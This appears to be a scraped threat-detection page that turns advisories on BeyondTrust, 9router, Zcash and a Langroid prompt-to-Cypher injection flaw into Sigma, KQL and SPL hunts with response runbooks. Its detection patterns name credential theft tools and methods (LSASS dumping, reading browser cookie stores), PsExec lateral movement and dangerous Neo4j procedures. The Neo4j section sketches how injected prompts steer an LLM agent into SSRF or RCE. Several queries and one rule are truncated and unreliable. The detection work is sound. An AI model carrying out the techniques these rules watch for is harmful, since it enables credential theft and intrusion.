BeyondTrust Patches Critical Auth Bypass Flaws in Remote Support and PRA

The Hacker News
2026-07-07 7 use cases 3 techniques 6 kill-chain phases detected

BeyondTrust has released updates to address two critical security flaws affecting Remote Support (RS) and Privileged Remote Access (PRA) products that, if successfully exploited, could allow unauthenticated attackers to take control of susceptible devices. The vulnerabilities are listed below - CVE-2026-40138 (CVSS score: 9.2) - A pre-authentication vulnerability exists in the

Actions on Objectives
Detected
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration. → Asset exposure — vulnerability matches article CVE(s)
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → [LLM] BeyondTrust RS/PRA appliance exposed to pre-auth bypass CVE-2026-40138/40139/40140/40141 (below 25.3.3)
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → Suspicious browser extension installation
Command & Control. Beacon to attacker infrastructure for control and tasking.
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → Infostealer — non-browser process accessing browser cookie/login DBs · Ransomware-style mass file rename / extension change · LSASS process access / dump (credential theft) · Remote service execution — PsExec / SMB lateral movement
BeyondTrust RS/PRA appliance exposed to pre-auth bypass CVE-2026-40138/40139/40140/40141 (below 25.3.3) AIExploitation High
Surfaces managed hosts/appliances whose Remote Support (RS) or Privileged Remote Access (PRA) software is at or below 25.3.2 and therefore vulnerable to the critical pre-auth authentication-bypass (CVE-2026-40138/40139), pre-auth DoS (CVE-2026-40140), and authenticated broken-access-control (CVE-2026-40141) flaws. Prioritises internet-facing instances because these are network-positioned, unauthenticated exploits on a privileged-access appliance with a repeated in-the-wild exploitation history (CVE-2024-12356, CVE-2026-1731). Rationale: Uses the four concrete CVE IDs and the vendor-stated fixed line (25.3.3, i.e. anything <=25.3.2 is exposed) from the advisory — the only high-fidelity, non-hallucinated values the article provides. Cross-checked against BeyondTrust's Trust Center advisory index and BleepingComputer/Cybersecurity Dive coverage confirming the pre-auth severity and prior RS/PRA exploitation history. Cross-checked against: • https://www.beyondtrust.com/trust-center/security-advisories • https://www.bleepingcomputer.com/news/security/beyondtrust-warns-of-pre-auth-rce-in-remote-support-software/ • https://www.cybersecuritydive.com/news/critical-flaw-beyondtrust-remote-support-early-exploitation/812215/
ATT&CKT1190 T1068
Data sourcesVulnerabilities.Vulnerabilities
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Appliance already upgraded to RS/PRA 25.3.3+ but the TVM/scanner inventory is stale and still reports the old build for up to a scan cycle
  • Decommissioned appliances still present in the asset inventory but no longer network-reachable
  • Version-string mismatch where a hotfixed build is flagged because the scanner keys on major.minor.patch only
  • BeyondTrust cloud-hosted (SaaS) instances flagged as customer-exposed when the vendor already patched them
Suppression filter
| where isnotempty(RecommendedSecurityUpdate)
Response runbook
1) TRIAGE: Confirm the flagged host is a live RS/PRA appliance and read its exact build; check IsInternetFacing/PublicIP to see whether it is reachable from the internet (the pre-auth bypass requires only network position). 2) CONTAIN: Restrict inbound access to the appliance's management/auth ports to trusted CIDRs at the firewall and schedule an emergency upgrade to RS/PRA 25.3.3+; if it was internet-facing and unpatched, treat as potentially compromised. 3) HUNT: On any appliance that was exposed, review appliance access/session logs and web root for newly written scripts, unexpected privileged sessions with no preceding interactive login, and outbound beaconing — the documented follow-on for prior RS/PRA CVEs (web shells/backdoors).

title: Browser Extension Installation via Registry
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d0a
status: experimental
description: |
    Registry writes under the browser extension policy keys —
    administrative install of an extension. Often used by adware /
    info-stealers to bypass user-level extension controls.
references:
    - https://attack.mitre.org/techniques/T1176/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1176
    - attack.persistence
logsource:
    category: registry_event
    product: windows
detection:
    selection:
        TargetObject|contains:
            - '\Software\Google\Chrome\Extensions\'
            - '\Software\Microsoft\Edge\Extensions\'
            - '\Software\Mozilla\Firefox\Extensions\'
    condition: selection
falsepositives:
    - Group-policy-managed extension whitelists
level: medium
ENDPOINT

| `drop_dm_object_name(Registry)`

title: Infostealer - Non-Browser Process Accessing Browser Credential Stores
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d01
status: experimental
description: |
    Stealers (RedLine, Lumma, Vidar, Atomic) read Login Data / cookies
    SQLite databases from Chrome/Edge/Firefox profile directories. Any
    non-browser process touching these files is a high-fidelity signal.
references:
    - https://attack.mitre.org/techniques/T1539/
    - https://attack.mitre.org/techniques/T1555/003/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1539
    - attack.t1555.003
    - attack.credential-access
logsource:
    category: file_access
    product: windows
detection:
    selection_path:
        TargetFilename|contains:
            - '\Google\Chrome\User Data\'
            - '\Microsoft\Edge\User Data\'
            - '\Mozilla\Firefox\Profiles\'
    selection_file:
        TargetFilename|endswith:
            - '\Login Data'
            - '\Cookies'
            - '\logins.json'
            - '\cookies.sqlite'
    filter_browser:
        Image|endswith:
            - '\chrome.exe'
            - '\msedge.exe'
            - '\firefox.exe'
            - '\brave.exe'
            - '\opera.exe'
    condition: selection_path and selection_file and not filter_browser
falsepositives:
    - Backup utilities reading user profile files
    - Browser sync agents from non-stock vendors
level: high
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Filesystem
    where (Filesystem.file_path="*\Google\Chrome\User Data\*\Login Data*"
        OR Filesystem.file_path="*\Google\Chrome\User Data\*\Cookies*"
        OR Filesystem.file_path="*\Microsoft\Edge\User Data\*\Login Data*"
        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\logins.json*"
        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\cookies.sqlite*")
      AND NOT Filesystem.process_name IN ("chrome.exe","msedge.exe","firefox.exe","brave.exe","opera.exe")
    by Filesystem.dest, Filesystem.process_name, Filesystem.file_path, Filesystem.user
| `drop_dm_object_name(Filesystem)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Filesystem
    where (Filesystem.file_path="*\Google\Chrome\User Data\*\Login Data*"
        OR Filesystem.file_path="*\Google\Chrome\User Data\*\Cookies*"
        OR Filesystem.file_path="*\Microsoft\Edge\User Data\*\Login Data*"
        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\logins.json*"
        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\cookies.sqlite*")
      AND NOT Filesystem.process_name IN ("chrome.exe","msedge.exe","firefox.exe","brave.exe","opera.exe")
    by Filesystem.dest, Filesystem.process_name, Filesystem.file_path, Filesystem.user
| `drop_dm_object_name(Filesystem)`

Data sourcesVulnerabilities DeviceInfo DeviceTvmSoftwareVulnerabilities
// TVM tables are daily snapshots — pin a 1-day window so the engine
// partitions on Timestamp instead of scanning the full retention.
DeviceTvmSoftwareVulnerabilities
| where Timestamp > ago(1d)
| where CveId in~ ("CVE-2026-40138", "CVE-2026-40139", "CVE-2026-40140", "CVE-2026-40141", "CVE-2026-1731", "CVE-2024-12356")

| project DeviceName, OSPlatform, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

// `DeviceTvmSoftwareVulnerabilities` is available. Otherwise this UC has
// no Sentinel translation — track via Update / Heartbeat OS-version
// gaps as a coarse approximation.
DeviceTvmSoftwareVulnerabilities
| where TimeGenerated > ago(1d)
| where CveId in~ ("CVE-2026-40138", "CVE-2026-40139", "CVE-2026-40140", "CVE-2026-40141", "CVE-2026-1731", "CVE-2024-12356")
| join kind=inner (DeviceInfo | where TimeGenerated > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId,

| order by VulnerabilitySeverityLevel asc, DeviceName asc

Ransomware-style mass file rename / extension change Actions on Objectives Medium
Threshold detection: many files renamed in short window, often with new extension.
ATT&CKT1486
Data sourcesEndpoint.Filesystem DeviceFileEvents
DeviceFileEvents
| where Timestamp > ago(1d)
| where InitiatingProcessAccountName !endswith "$"
| where ActionType in ("FileRenamed","FileModified")
| summarize files = dcount(FileName) by DeviceName, InitiatingProcessAccountName, bin(Timestamp, 1m)
| where files > 200    // empirical: > 200 unique-file renames in 1m by one account on one host
                       //            is well above the P99 of legitimate bulk-tooling
| order by files desc

ImFileEvent
| where TimeGenerated > ago(1d)
| where ActorUsername !endswith "$"
| where EventType in ("FileRenamed","FileModified")
| summarize files = dcount(TargetFileName)
            by DvcHostname, ActorUsername, ActingProcessName, bin(TimeGenerated, 1m)
| where files > 200    // P99 of legit bulk-tooling per-minute rename volume
| order by files desc
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count, dc(Filesystem.file_name) AS files
    from datamodel=Endpoint.Filesystem
    where Filesystem.action IN ("modified","renamed")
    by Filesystem.dest, Filesystem.user, _time span=1m
| `drop_dm_object_name(Filesystem)`
| where files > 200
| sort - files
| tstats summariesonly=false count, dc(Filesystem.file_name) AS files
    from datamodel=Endpoint.Filesystem
    where Filesystem.action IN ("modified","renamed")
    by Filesystem.dest, Filesystem.user, _time span=1m
| `drop_dm_object_name(Filesystem)`
| where files > 200
| sort - files
LSASS process access / dump (credential theft) Actions on Objectives High
Mimikatz, comsvcs.dll MiniDump, or any non-Windows process opening LSASS.
ATT&CKT1003.001 T1003
Data sourcesEndpoint.Processes DeviceEvents
DeviceEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where ActionType == "OpenProcessApiCall"
| where FileName =~ "lsass.exe"
| where InitiatingProcessFileName !in~ ("MsSense.exe","MsMpEng.exe","csrss.exe",
                                          "svchost.exe","wininit.exe","services.exe",
                                          "lsm.exe","SearchProtocolHost.exe")
| project Timestamp, DeviceName, ActionType, FileName,
          InitiatingProcessFileName, InitiatingProcessCommandLine,
          InitiatingProcessFolderPath, AccountName
| order by Timestamp desc
// SecurityEvent EventID 4663 = object access. AccessMask 0x10 / 0x40 / 0x1010
// indicate read access to lsass.exe — credential-dump signature. Audit
// Object Access > Audit File System policy required.
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4663
| where ObjectName endswith "\lsass.exe"
| where Account !endswith "$"
| project TimeGenerated, Computer, Account, ObjectName, ProcessName,
          AccessMask, AccessReason
| order by TimeGenerated desc

title: LSASS Process Access Outside Microsoft-Signed Tooling
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d04
status: experimental
description: |
    Anything opening lsass.exe with read-memory access that isn't a
    Microsoft signed component (Defender, csrss, etc.) is suspect.
    Mimikatz / Pypykatz / nanodump signature.
references:
    - https://attack.mitre.org/techniques/T1003/001/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1003.001
    - attack.credential-access
logsource:
    category: process_access
    product: windows
detection:
    selection:
        TargetImage|endswith: '\lsass.exe'
    filter_known_good:
        SourceImage|endswith:
            - '\MsSense.exe'
            - '\MsMpEng.exe'
            - '\csrss.exe'
            - '\svchost.exe'
            - '\wininit.exe'
            - '\services.exe'
            - '\lsm.exe'
            - '\SearchProtocolHost.exe'
    condition: selection and not filter_known_good
falsepositives:
    - Third-party EDR / forensic tools — extend the filter list
level: high
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where (Processes.process="*lsass*" OR Processes.process="*sekurlsa*"
        OR Processes.process="*MiniDump*" OR Processes.process="*comsvcs.dll*MiniDump*"
        OR Processes.process="*procdump*lsass*")
       OR (Processes.process_name="rundll32.exe" AND Processes.process="*comsvcs*MiniDump*")
    by Processes.dest, Processes.user, Processes.process_name, Processes.process, Processes.parent_process_name
| `drop_dm_object_name(Processes)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where (Processes.process="*lsass*" OR Processes.process="*sekurlsa*"
        OR Processes.process="*MiniDump*" OR Processes.process="*comsvcs.dll*MiniDump*"
        OR Processes.process="*procdump*lsass*")
       OR (Processes.process_name="rundll32.exe" AND Processes.process="*comsvcs*MiniDump*")
    by Processes.dest, Processes.user, Processes.process_name, Processes.process, Processes.parent_process_name
| `drop_dm_object_name(Processes)`
Remote service execution — PsExec / SMB lateral movement Actions on Objectives High
psexec / paexec / smbexec / wmic /node — service install over SMB from remote host.
ATT&CKT1021.002 T1569.002
Data sourcesEndpoint.Processes DeviceProcessEvents
DeviceProcessEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where FileName in~ ("psexec.exe","psexesvc.exe","paexec.exe","smbexec.py")
   or (FileName =~ "wmic.exe" and ProcessCommandLine has "/node:")
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName
| order by Timestamp desc

SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4688            // process-create (audit-policy required)
| where Account !endswith "$"
| where NewProcessName endswith "\psexec.exe"
   or NewProcessName endswith "\psexesvc.exe"
   or NewProcessName endswith "\paexec.exe"
   or (NewProcessName endswith "\wmic.exe" and CommandLine has "/node:")
| project TimeGenerated, Computer, Account, NewProcessName, CommandLine,
          ParentProcessName
| order by TimeGenerated desc

title: PsExec / SMB Lateral Movement Tooling Execution
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d03
status: experimental
description: |
    PsExec, paexec, smbexec, csexec, remcom — admin-grade tooling that
    pivots over SMB. Pair with `wmic /node:` for the full cluster.
references:
    - https://attack.mitre.org/techniques/T1021/002/
    - https://attack.mitre.org/techniques/T1569/002/
author: Clankerusecase
date: 2026/05/02

    - attack.execution

    category: process_creation

            - '\psexesvc.exe'

            - '\csexec.exe'
            - '\remcom.exe'
            - '\smbexec.py'
    selection_wmic_remote:

falsepositives:

      a known-admin-host watchlist
level: high

Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → [LLM] 9router ALWAYS_PROTECTED bypass: auth-denied then success on /api/settings/database (CVE-2026-55500) · Article-specific behavioural hunt — [GHSA / CRITICAL] CVE-2026-55500: 9routers has Exposure of Sensitive Information
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → [LLM] 9router malicious database import (wipe-and-replace) via POST /api/settings/database (CVE-2026-55500)
Command & Control. Beacon to attacker infrastructure for control and tasking.
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → [LLM] 9router full database/credential export via GET /api/settings/database (CVE-2026-55500) · OAuth consent / suspicious app grant
9router full database/credential export via GET /api/settings/database (CVE-2026-55500) AIActions on Objectives High
Hunts the credential-theft step of CVE-2026-55500: an authenticated (default-password) GET to /api/settings/database that returns the complete 9router database — plaintext apiKeys, OAuth tokens and OIDC secrets. Catches both the web-tier request (large 200 response body) and the attacker-side curl/PowerShell process pulling the endpoint. Rationale: Uses the article's exact stable IOC — the /api/settings/database export route — plus the >1MB response-body signal that distinguishes a full-DB dump from a normal settings read, and the reproduction command's curl/auth_token pattern for the endpoint side. External corroboration: 9router (vendor decolua) has a documented family of unprotected-admin-API/auth-bypass CVEs. Cross-checked against: • https://github.com/advisories/GHSA-fhh6-4qxv-rpqj • https://www.sentinelone.com/vulnerability-database/cve-2026-10269/
ATT&CKT1552.001 T1213 T1555
Data sourcesWeb.Web
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Legitimate admin taking a manual configuration backup via the export endpoint during a maintenance window
  • 9router's own scheduled backup/export job hitting the endpoint from localhost
  • Automated config-management tooling (Ansible/Terraform) reading settings via the API
  • A monitoring/uptime probe issuing GET to the settings path (usually small body, filtered by the >1MB gate)
  • Developer running curl against a local dev instance on port 20128 during testing
Suppression filter
| where not (SrcIpAddr in ("127.0.0.1","::1") and HttpRequestHeaderUserAgent has_any ("9router-backup","node-fetch"))
Response runbook
1) TRIAGE: Confirm the SrcIpAddr/host and account behind the GET — is it an admin from a known jump box during a change window, or an external/unfamiliar IP with a curl/non-browser UA? Check response size (full dump ~ all tables). 2) CONTAIN: Treat every secret in 9router as compromised — rotate all apiKeys, provider OAuth tokens and OIDC client secrets immediately, force-reset the dashboard password, and block the source IP; upgrade 9router past 0.4.71. 3) HUNT: Pivot on the same SrcIpAddr/account for a subsequent POST to /api/settings/database (import/persistence) and for downstream use of the leaked API keys/OAuth tokens across dependent services.
DeviceProcessEvents
| where Timestamp > ago(7d)
| where FileName in~ ("curl.exe","wget.exe","powershell.exe","pwsh.exe")
| where ProcessCommandLine has "/api/settings/database"
| where not (ProcessCommandLine has_any ("-X POST","--data","-d ","--request POST"))   // POST = import, handled separately
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc
ImWebSession
| where TimeGenerated > ago(7d)
| where HttpMethod =~ "GET"
| where Url has "/api/settings/database"
| where toint(HttpStatusCode) == 200
| where HttpResponseBodyBytes > 1000000   // full DB dump — export returns every table
| project TimeGenerated, SrcIpAddr, DstHostname, DstPortNumber, Url, HttpMethod, HttpStatusCode, HttpResponseBodyBytes, HttpRequestHeaderUserAgent
| order by TimeGenerated desc

9router malicious database import (wipe-and-replace) via POST /api/settings/database (CVE-2026-55500) AIInstallation High
Hunts the takeover/persistence step of CVE-2026-55500: a POST to /api/settings/database that overwrites every table in a single transaction — resetting the password hash and all settings to attacker-controlled values. Fires on the web-tier POST and on the attacker-side curl -X POST -d that carries the crafted database body. Rationale: Anchors on the same stable endpoint /api/settings/database but pivots on the POST verb — the article states the POST path performs a full wipe-and-replace transaction that resets the password hash. curl -X POST -d body from the reproduction steps gives the endpoint-side signature. Cross-checked against: • https://github.com/advisories/GHSA-fhh6-4qxv-rpqj • https://www.sentinelone.com/vulnerability-database/cve-2026-10269/

1) TRIAGE: Determine whether the POST correlates with an approved change/restore ticket and originates from an admin jump host; a POST from an external IP or one immediately following a GET export from the same source is high-suspicion. 2) CONTAIN: Isolate the 9router host, snapshot the database for forensics, then restore from a trusted pre-incident backup; force-rotate the dashboard password and all stored secrets since the import may have set an attacker password. 3) HUNT: Look for a successful dashboard login immediately after this POST (attacker-set credentials) and for the preceding GET export from the same SrcIpAddr; audit downstream services for use of tokens that existed before the overwrite.

| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc

9router ALWAYS_PROTECTED bypass: auth-denied then success on /api/settings/database (CVE-2026-55500) AIExploitation Medium
Correlation hunt for token forging / middleware bypass against CVE-2026-55500: the same source is denied (401/403) on /api/settings/database and then obtains a 200 within a short window, indicating a successful auth-token guess, forge, or ALWAYS_PROTECTED circumvention rather than a normal authenticated admin. Rationale: Grounded in the article's statement that the endpoint is 'protected' only by the ALWAYS_PROTECTED JWT/CLI-token check; a denied-then-allowed sequence on that exact route from one source is the observable signature of forging/bypassing that check rather than a legitimately logged-in admin (who would 200 on the first try). Cross-checked against: • https://github.com/advisories/GHSA-fhh6-4qxv-rpqj • https://www.sentinelone.com/vulnerability-database/cve-2026-10269/
ATT&CKT1556 T1190
Data sourcesWeb.Web
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Admin whose session/JWT expired (401), who re-authenticates and retries successfully
  • Automation with a stale cached token that refreshes and retries within the hour
  • Load balancer / proxy health probe hitting the route before auth cookie is set
  • Browser pre-flight or SSO redirect flow producing a transient 401 then 200
  • Password-manager autofill retry after an initial failed submit
Suppression filter
| where DeltaSec < 120 and Denied >= 3   // keep only tight, repeated-denial-then-success bursts; drop lone expiry/refresh
Response runbook
1) TRIAGE: Inspect the denied requests' Authorization/cookie shape and the delta to success — many rapid 401/403 (token brute/forge) before a 200 is far more suspicious than a single expiry-and-refresh. Confirm the SrcIpAddr is not a known admin/automation. 2) CONTAIN: Invalidate all active dashboard sessions/CLI tokens, force credential rotation, and restrict the endpoint to an allow-listed management network; patch 9router past 0.4.71. 3) HUNT: For any source that crossed the bypass threshold, pull its subsequent GET (export) and POST (import) activity on /api/settings/database and correlate with new admin logins.
ImWebSession
| where TimeGenerated > ago(7d)
| where Url has "/api/settings/database"
| extend Status = toint(HttpStatusCode)
| summarize Denied = countif(Status in (401,403)),
            Success = countif(Status == 200),
            FirstDenied = minif(TimeGenerated, Status in (401,403)),
            FirstSuccess = minif(TimeGenerated, Status == 200)
            by SrcIpAddr, bin(TimeGenerated, 1h)
| where Denied > 0 and Success > 0 and FirstSuccess > FirstDenied   // rejected first, then let in = bypass/forge
| project SrcIpAddr, WindowStart = bin_at(FirstDenied, 1h, FirstDenied), Denied, Success, FirstDenied, FirstSuccess, DeltaSec = datetime_diff('second', FirstSuccess, FirstDenied)
| order by FirstSuccess desc
WEB
Toggle if your env has no CIM data-model acceleration.

| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime from datamodel=Web where Web.url="*/api/settings/database*" by Web.src Web.status _time span=1h | `drop_dm_object_name(Web)` | eval denied=if(status="401" OR status="403",count,0), success=if(status="200",count,0) | stats sum(denied) as denied sum(success) as success min(firstTime) as firstTime max(lastTime) as lastTime by src _time | where denied>0 AND success>0 | `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)`

Pre-exploitation discovery hunt for CVE-2026-55500: a single source making an abnormal volume of requests to /api/settings/database — typically HEAD/OPTIONS/GET returning 401/403/404 while probing for an exposed, unpatched 9router instance before attempting the credential export. Vulnerable halo2_gadgets / Orchard / Zcash node software inventory (CVE-2026-54496) AIExploitation High
Flags managed hosts whose software inventory carries a version of halo2_gadgets, orchard, zcash_primitives, zcashd, or zebrad below the NU6.2 fix, i.e. exposing the under-constrained variable-base scalar-mult soundness bug. This is attack-surface identification: the article says exploitation itself is undetectable on-chain, so the only defensible SOC action is finding and patching the vulnerable component. Rationale: Uses the five concrete affected-version boundaries the advisory publishes (halo2_gadgets<0.5.0, orchard<0.14.0, zcash_primitives<0.28.0, zcashd<6.20.0, zebrad<5.0.0) mapped to CVE-2026-54496 in the TVM catalog; confirmed against the Zcash Foundation advisory and BlockSec analysis. This is the only honest detection the article supports since exploitation leaves no on-chain signature. Cross-checked against: • https://github.com/advisories/GHSA-ww9q-8r59-xv46 • https://zfnd.org/zebra-4-5-3-and-5-0-0-emergency-soft-fork-and-nu6-2-activation/ • https://blocksec.com/blog/web3-security-zcash-orchard-soundness-bug-analysis
ATT&CKT1195.001
Data sourcesVulnerabilities.Vulnerabilities
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Dev/test VMs intentionally pinned to a pre-NU6.2 zebrad/zcashd for regression or fork-replay testing
  • Nodes already mitigated by the 4.5.3 soft fork but still <5.0.0, correctly flagged as vulnerable but operationally lower risk
  • Wallet-only installs bundling zcash_primitives that never touch the Orchard proving circuit
  • Air-gapped analysis nodes deliberately running historical versions for research
  • TVM catalog ingestion lag causing intermittent appear/disappear of the finding across scans
Response runbook
1) Triage: confirm the host's role — is this a consensus-participating full node (zebrad/zcashd) or a library dependency in a Rust build host? A live full node is highest priority. 2) Contain: upgrade to fixed versions (zebrad 5.0.0 / zcashd 6.20.0 / orchard 0.14.0 / halo2_gadgets 0.5.0 / zcash_primitives 0.28.0); until then ensure the 4.5.3+ soft fork disabling Orchard actions is active. 3) Hunt: enumerate every other host in inventory importing these crates (DeviceTvmSoftwareInventory) and any CI/build agent compiling them, since the flaw ships transitively via the dependency graph.

    | project DeviceName, InvSoftwareName = SoftwareName, InvSoftwareVersion = SoftwareVersion
  ) on DeviceName
| order by Timestamp desc

Live Zcash consensus node (zebrad/zcashd) running unpatched build — CVE-2026-54496 exposure AIExploitation Medium
Surfaces execution of the zebrad or zcashd node binaries on managed endpoints and projects their product-version string so an analyst can triage which live nodes predate the NU6.2 fix. Complements the TVM-catalog UC with process telemetry for hosts TVM may not classify (self-compiled binaries, non-package-managed installs). Rationale: Pivots on the exact node binary names (zebrad, zcashd) the advisory lists as affected products and projects ProcessVersionInfoProductVersion so an analyst can compare against the fixed builds (zebrad 5.0.0 / zcashd 6.20.0); catches self-compiled nodes a package-manager-based TVM scan would miss. Cross-checked against: • https://github.com/advisories/GHSA-ww9q-8r59-xv46 • https://zfnd.org/zebra-4-5-3-and-5-0-0-emergency-soft-fork-and-nu6-2-activation/
ATT&CKT1195.001
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Sanctioned Zcash node operators running production nodes as intended
  • Already-patched nodes (zebrad>=5.0.0 / zcashd>=6.20.0) — surfaced version lets the analyst filter these out
  • Blockchain research/dev sandboxes and testnet nodes
  • CI/build agents that compile and briefly execute zebrad for integration tests
  • Wallet or exchange back-end software that embeds and launches zcashd
Response runbook
1) Triage: read the surfaced ProcessVersionInfoProductVersion — if zebrad<5.0.0 or zcashd<6.20.0 the node is exposed; confirm whether it participates in mainnet consensus or is a testnet/dev instance. 2) Contain: upgrade the node to the NU6.2 build (zebrad 5.0.0 / zcashd 6.20.0) and verify the 4.5.3+ Orchard-disabling soft fork is active in the interim; restrict the node's peer exposure if it cannot be patched immediately. 3) Hunt: cross-reference the host against DeviceTvmSoftwareInventory for the halo2_gadgets/orchard crates, and check for any other Zcash tooling or wallets on the same host that statically link the vulnerable circuit.

Neo4j server outbound egress to external host (LOAD CSV / apoc.load SSRF exfil) AIActions on Objectives Medium
Hunts a Neo4j server host initiating outbound web connections, the observable side-effect of the LOAD CSV remote-fetch and apoc.load.* SSRF primitives an attacker reaches through prompt-to-Cypher injection in Langroid's Neo4jChatAgent (CVE-2026-55615). Scopes to hosts that expose the Bolt listener (7687) so it fires on the DB tier, not on generic clients. Rationale: Article names LOAD CSV remote-fetch (SSRF) as a non-contingent floor primitive and apoc.load.* as the config-conditional ceiling; both manifest identically on the wire as the Neo4j server (java/neo4j) reaching out to a remote host. Scoping to hosts that listen on Bolt 7687 keeps it on the DB tier. Cross-checked against: • https://github.com/advisories/GHSA-2pq5-3q89-j7cc • https://github.com/advisories/GHSA-mxfr-6hcw-j9rq • https://neo4j.com/docs/apoc/current/
ATT&CKT1071.001 T1190
Data sourcesNetwork_Traffic.All_Traffic
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Neo4j APOC plugin legitimately pulling remote CSV/JSON for a scheduled import job
  • JVM/Neo4j update or license/telemetry heartbeat to vendor endpoints
  • Backup or monitoring agent co-resident on the DB host egressing over 443
  • Graph data-loading pipeline that intentionally uses LOAD CSV from an approved internal-but-public-IP source
  • Container image pulling metadata from a cloud metadata proxy on 80
Suppression filter
| where DstHostname !endswith "neo4j.com" and DstIpAddr !in ("<approved-import-source-ips-if-any>")
Response runbook
1) Triage: pull the destination IP/URL and confirm it is not an approved import/update source; correlate the egress timestamp against Neo4j query.log for a LOAD CSV / apoc.load.* statement in the same second. 2) Contain: block the destination at the proxy/firewall and, if the query is attacker-steered, disable the Langroid Neo4jChatAgent or revoke APOC from the DB role. 3) Hunt: review query.log for other apoc.import/export/runFile and dbms.* calls from the same session, and check whether the triggering prompt came from RAG-ingested content.
DeviceNetworkEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName in~ ("java.exe","neo4j.exe")
| where InitiatingProcessCommandLine has "neo4j"
| where RemoteIPType == "Public"
| where RemotePort in (80, 443, 21)
| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteIP, RemoteUrl, RemotePort
| order by Timestamp desc
let Neo4jHosts = ImNetworkSession
    | where TimeGenerated > ago(7d)
    | where DstPortNumber == 7687      // Neo4j Bolt listener = the DB tier
    | distinct DstHostname;
ImNetworkSession
| where TimeGenerated > ago(7d)
| where NetworkDirection == "Outbound" or isempty(NetworkDirection)
| where DstPortNumber in (80, 443, 21)      // LOAD CSV / apoc.load remote fetch
| where DstIpAddr !startswith "10." and DstIpAddr !startswith "192.168." and DstIpAddr !startswith "172.16." and DstIpAddr !startswith "127."
| where SrcHostname in (Neo4jHosts)
| project TimeGenerated, SrcHostname, SrcIpAddr, DstIpAddr, DstHostname, DstPortNumber, Url, NetworkApplicationProtocol
| order by TimeGenerated desc

Dangerous APOC / dbms Cypher observed in Neo4j query log (prompt-to-Cypher RCE) AIExploitation High
Hunts Neo4j query/audit-log lines containing the exact code-execution and file/network primitives the article flags as the RCE ceiling — apoc.load.*, apoc.cypher.run, apoc.import/export, dbms.executeSystemCommand, dbms.security, CALL db.*, and LOAD CSV. Because Langroid ships LLM-generated Cypher unvalidated, any of these appearing from the agent's DB session is a strong injection signal. Rationale: The advisory enumerates the exact procedure families that constitute the RCE/SSRF ceiling (apoc.load.*, apoc.cypher.runFile, apoc.import/export, CALL dbms.*, LOAD CSV); these are the suggested-fix blocklist verbatim, so their presence in a query-log line from the agent's session is high-fidelity. Defender left empty because Neo4j query text lives in the app/audit log, not endpoint EDR telemetry. Cross-checked against: • https://github.com/advisories/GHSA-2pq5-3q89-j7cc • https://neo4j.com/docs/apoc/current/ • https://github.com/advisories/GHSA-mxfr-6hcw-j9rq
ATT&CKT1059 T1190
Data sources
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Legitimate DBA or ETL job running apoc.import/apoc.export for a scheduled data load
  • Approved internal tooling using LOAD CSV to bulk-ingest graph data
  • Neo4j maintenance scripts calling CALL db.* for schema/index management
  • Monitoring integration querying dbms.* for health metrics
  • Developer running APOC procedures interactively against a non-prod graph
Suppression filter
| where ProcessName !has "etl" and SyslogMessage !has "scheduled-import"
Response runbook
